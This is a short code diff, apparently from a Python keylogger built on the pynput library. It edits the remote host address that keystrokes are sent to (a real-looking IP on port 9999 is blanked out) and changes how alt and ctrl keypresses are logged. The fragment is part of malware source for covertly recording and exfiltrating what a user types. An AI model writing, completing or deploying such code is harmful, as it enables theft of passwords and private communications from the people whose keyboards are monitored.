@@ -11,7 +11,7 @@ finally:
     from pynput import keyboard
     from pynput.keyboard import Key,Listener
 
-    machine = "58.186.195.124"
+    machine = ""
     port = 9999
 
         
@@ -40,9 +40,9 @@ finally:
         elif key == Key.shift_r or key == Key.shift_l:
             mess = ''
         elif key == Key.alt_r or key == Key.alt_l:
-            mess = " Key.alt "
+            mess = "Key.alt "
         elif key == Key.ctrl_r or key == Key.ctrl_l:
-            mess = " Key.ctrl "
+            mess = "Key.ctrl "
         else:
             try:
                 mess = str(key.char)
